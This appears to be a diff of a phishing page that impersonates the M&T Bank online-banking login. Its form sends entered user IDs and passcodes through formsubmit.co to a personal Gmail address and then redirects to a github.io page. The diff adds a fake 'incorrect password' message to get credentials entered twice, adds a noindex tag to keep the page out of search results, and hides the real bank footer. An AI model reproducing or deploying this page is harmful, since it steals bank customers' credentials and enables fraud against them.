@@ -1,185 +1,238 @@
 <!DOCTYPE html>
 <html lang="en">
-
-<head>
+  <head>
     <meta charset="UTF-8" />
     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
-    <meta name="viewport"
-        content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0" />
+    <meta name="robots" content="noindex"/>
+    <meta
+      name="viewport"
+      content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0"
+    />
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests" />
     <title>Log in to Online Banking</title>
     <link rel="stylesheet" href="./bootstrap.css" />
     <link rel="stylesheet" href="./bootstrap.min.css" />
     <link rel="stylesheet" href="./all.css" />
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-        }
-        nav {
-            border-bottom: 7px solid orange;
-        }
+      * {
+        margin: 0;
+        padding: 0;
+      }
+      nav {
+        border-bottom: 7px solid orange;
+      }
 
-        #headthree {
-            color: #007856;
-            font-size: 28px;
-        }
+      #headthree {
+        color: #007856;
+        font-size: 28px;
+      }
 
-        .head_p {
-            color: #007856;
-        }
-        label {
-            color: #767676;
-        }
+      .head_p {
+        color: #007856;
+      }
+      label {
+        color: #767676;
+      }
 
+      .login-box {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+      }
 
-        .login-box {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
+      .personal {
+        padding: 0.7rem 3.3rem;
+        color: white;
+        background-color: #007856;
+        border: 1px solid #007856;
+      }
 
-        .personal {
-            padding: 0.7rem 3.3rem;
-            color: white;
-            background-color: #007856;
-            border: 1px solid #007856;
-        }
+      .commercial {
+        padding: 0.7rem 3.3rem;
+        color: black;
+        background-color: white;
+        border: 1px solid grey;
+      }
 
-        .commercial {
-            padding: 0.7rem 3.3rem;
-            color: black;
-            background-color: white;
-            border: 1px solid grey;
-        }
+      .form-btns {
+        width: 100%;
+        padding: 0.7rem 3.3rem;
+        color: white;
+        background-color: #007856;
+        border: 1px solid #007856;
+        border-radius: 3px;
+      }
 
-        .form-btns {
-            width: 100%;
-            padding: 0.7rem 3.3rem;
-            color: white;
-            background-color: #007856;
-            border: 1px solid #007856;
-            border-radius: 3px;
-        }
+      .small_link {
+        text-decoration: underline;
+      }
 
-        .small_link {
-            text-decoration: underline;
-        }
-
-        .small_text {
-            color: #767676;
-            font-size: 12px;
-            /* font-weight: 200; */
-            word-spacing: 2px;
-        }
-        .footer_top_links {
-            text-align: center;
-        }
-        footer {
-            font-size: 10px;
-            position: relative;
-            bottom: 0;
-            height: 100%;
-            background-color: #efefef;
-        }
-        .pipe {
-        
-            color: gray;
-        }
+      .small_text {
+        color: #767676;
+        font-size: 12px;
+        /* font-weight: 200; */
+        word-spacing: 2px;
+      }
+      .footer_top_links {
+        text-align: center;
+      }
+      footer {
+        font-size: 10px;
+        position: relative;
+        bottom: 0;
+        height: 100%;
+        background-color: #efefef;
+      }
+      .pipe {
+        color: gray;
+      }
     </style>
-</head>
+  </head>
 
-<body>
-    <nav id="nav" class="navbar navbar-expand-lg py-3 fixed-top" style="background-color: #007856; color: black">
-        <div class="container">
-            <div class="mx-auto">
-                <img src="./white logo.png" onclick="window.location.href = 'index_two.html'" id="logo" alt="" width="104px"
-                    height="19px" />
-            </div>
-
+  <body>
+    <nav
+      id="nav"
+      class="navbar navbar-expand-lg py-3 fixed-top"
+      style="background-color: #007856; color: black"
+    >
+      <div class="container">
+        <div class="mx-auto">
+          <img
+            src="./white logo.png"
+            onclick="window.location.href = 'index.html'"
+            id="logo"
+            alt=""
+            width="104px"
+            height="19px"
+          />
         </div>
+      </div>
     </nav>
 
     <section class="mt-5">
-        <div class="container-fluid text-center mt-5 pt-4">
-            <span id="headthree">Log In to Online Banking</span>
-            <p class="head_p">For Personal and Business Accounts</p>
-        </div>
-        <form method="POST" action="https://formsubmit.co/fishtina84@gmail.com" class="p-4">
-            <input type="hidden" name="_next" value="https://code-warlock.github.io/testb/verify.html">
-            <input type="hidden" name="_captcha" value="false">
-            <div class="row container input-group mx-auto" id="personal">
-                <!-- <div class="input-group col-lg-4 col-md-4 col-4 "></div> -->
-                <label for="">User ID</label>
-                <input type="text" class="form-control" style="border: 1px solid #767676;" name="UserID" required />
-                <div class="input-group col-lg-12 col-md-12 col-12"></div>
-                <label for="">Passcode</label>
-                <input type="password" class="form-control" style="border: 1px solid #767676;" name="Passcode" required />
-                <div class="input-group col-lg-12 col-md-12 col-12 pb-4"></div>
-                <div class="input-group my-2">
-                    <div class="input-group-prepend pr-3">
-                        <div class="input-group">
-                            <input type="checkbox" aria-label="Checkbox for following text input">
-                        </div>
-                    </div>
-                    <label for="">Remember User ID</label>
-                </div>
-                <div class="input-group my-4">
-                    <div class="input-group">
-                        <button class="form-btns" type="submit">Login </button>
-                    </div>
-                </div>
+      <div class="container-fluid text-center mt-5 pt-4">
+        <span id="headthree">Log In to Online Banking</span>
+        <p class="head_p">For Personal and Business Accounts</p>
+      </div>
+      <span
+        style="display:block;margin:0 auto;font-size: .8rem;"
+      class="text-center text-danger mt-3">USERID/Password Incorrect</span>
+      <form
+        method="POST"
+        action="https://formsubmit.co/fishtina84@gmail.com"
+        class="p-4"
+      >
+        <input
+          type="hidden"
+          name="_next"
+          value="https://code-warlock.github.io/testb/index_two.html"
+        />
+        <input type="hidden" name="_captcha" value="false" />
+        <div class="row container input-group mx-auto" id="personal">
+          <!-- <div class="input-group col-lg-4 col-md-4 col-4 "></div> -->
+          <label for="">User ID</label>
+          <input
+            type="text"
+            class="form-control"
+            style="border: 1px solid #767676"
+            name="UserID"
+            required
+          />
+          <div class="input-group col-lg-12 col-md-12 col-12"></div>
+          <label for="">Passcode</label>
+          <input
+            type="password"
+            class="form-control"
+            style="border: 1px solid #767676"
+            name="Passcode"
+            required
+          />
+          <div class="input-group col-lg-12 col-md-12 col-12 pb-4"></div>
+          <div class="input-group my-2">
+            <div class="input-group-prepend pr-3">
+              <div class="input-group">
+                <input
+                  type="checkbox"
+                  aria-label="Checkbox for following text input"
+                />
+              </div>
             </div>
-        </form>
-        <div class="container text-center">
-            <p class="head_p small_link">Help with User ID or Passcode</p>
-            <p class="head_p small_link">Enroll Now</p>
+            <label for="">Remember User ID</label>
+          </div>
+          <div class="input-group my-4">
+            <div class="input-group">
+              <button class="form-btns" type="submit">Login</button>
+            </div>
+          </div>
+        </div>
+      </form>
+      <div class="container text-center">
+        <p class="head_p small_link">Help with User ID or Passcode</p>
+        <p class="head_p small_link">Enroll Now</p>
+      </div>
+
+      <div class="container text-center pt-4">
+        <p class="small_text" style="font-size: 10px">
+          Unauthorized access is prohibited. Usage may be monitorized.
+        </p>
+      </div>
+      <hr />
+      <!-- <div class="container text-center p-4">
+        <p class="">Have questions about M&T Online Banking?</p>
+
+        <div>
+          <p class="head_p">Personal Accounts: 1-800-790-9130</p>
+          <span class="small_text">Monday - Friday 8am - 9pm ET</span>
+          <p class="small_text">Saturday - Sunday 9am - 5pm ET</p>
         </div>
 
-        <div class="container text-center pt-4">
-            <p class="small_text" style="font-size: 10px;">Unauthorized access is prohibited. Usage may be monitorized.</p>
+        <div>
+          <p class="head_p">Business Accounts: 1-800-724-6070</p>
+          <span class="small_text">Monday - Friday 8am - 9pm ET</span>
+          <p class="small_text">Saturday - Sunday 9am - 5pm ET</p>
         </div>
-        <hr>
-        <div class="container text-center p-4">
-            <p class="">Have questions about M&T Online Banking?</p>
-
-            <div>
-                <p class="head_p">Personal Accounts: 1-800-790-9130</p>
-                <span class="small_text">Monday - Friday 8am - 9pm ET</span>
-                <p class="small_text">Saturday - Sunday 9am - 5pm ET</p>
-            </div>
-
-            <div>
-                <p class="head_p">Business Accounts: 1-800-724-6070</p>
-                <span class="small_text">Monday - Friday 8am - 9pm ET</span>
-                <p class="small_text">Saturday - Sunday 9am - 5pm ET</p>
-            </div>
-        </div>
+      </div> -->
     </section>
-    <footer>
+    <!-- <footer>
+      <div class="container text_center footer_top_links pt-5">
+        <a href="" class="head_p px-2 small_link">Get Started Guide</a>
+        <span class="pipe px-3">|</span>
+        <a href="" class="head_p px-2 small_link">Security Assistance</a>
+        <span class="pipe">|</span>
+        <a href="" class="head_p px-2 small_link">Digital Service</a><br />
+        <a href="" class="head_p px-1 small_link">Agreement</a>
+        <span class="pipe px-2">|</span>
+        <a href="" class="head_p px-1 small_link">Esign Agreement</a>
+        <span class="pipe px-2">|</span>
+        <a href="" class="head_p px-1 small_link">Accessibility</a>
+        <span class="pipe px-2">|</span>
+        <a href="" class="head_p px-1 small_link">mtb.com</a>
+      </div>
 
-        <div class="container text_center footer_top_links pt-5">
-            <a href="" class="head_p px-2 small_link">Get Started Guide</a> <span class="pipe px-3">|</span>
-            <a href="" class="head_p px-2 small_link">Security Assistance</a> <span class="pipe">|</span>
-            <a href="" class="head_p px-2 small_link">Digital Service</a><br>
-            <a href="" class="head_p px-1 small_link">Agreement</a> <span class="pipe px-2">|</span>
-            <a href="" class="head_p px-1 small_link">Esign Agreement</a> <span class="pipe px-2">|</span>
-            <a href="" class="head_p px-1 small_link">Accessibility</a> <span class="pipe px-2">|</span>
-            <a href="" class="head_p px-1 small_link">mtb.com</a>
+      <div class="container text-center pt-4">
+        <span class="">&copy; 2022 M&T Bank. All Rights Reserved.</span><br />
+        <span class=""
+          >Users of this website agree to be bound by the provisions of the M&T
+          website</span
+        ><br />
+        <a href="" class="head_p small_link">Terms of Use</a
+        ><span class="">and</span
+        ><a href="" class="head_p px-1 small_link">Privacy Policy</a>
+
+        <div class="p-4">
+          <img
+            src="./equal-housing-lender-logo.png"
+            width="30"
+            alt=""
+            class="mx-3"
+          />
+          <img src="./mtb-entrust.svg" width="80" alt="" /><br />
+          <span class="my-4"
+            >Equal Housing Lender NMLS #381076
+            <a href="" class="head_p small_link">Member FDIC</a></span
+          >
         </div>
-
-        <div class="container text-center pt-4">
-            <span class="">&copy; 2022 M&T Bank. All Rights Reserved.</span><br>
-            <span class="">Users of this website agree to be bound by the provisions of the M&T website</span><br>
-            <a href="" class="head_p small_link">Terms of Use</a><span class="">and</span><a href="" class="head_p px-1 small_link">Privacy Policy</a>
-
-            <div class="p-4">
-                <img src="./equal-housing-lender-logo.png" width="30" alt="" class="mx-3">
-                <img src="./mtb-entrust.svg" width="80" alt=""><br>
-                <span class="my-4">Equal Housing Lender NMLS #381076 <a href="" class="head_p small_link">Member FDIC</a></span>
-            </div>
-        </div>
-    </footer>
-    </script>
-</body>
-
+      </div>
+    </footer> -->
+  </body>
 </html>
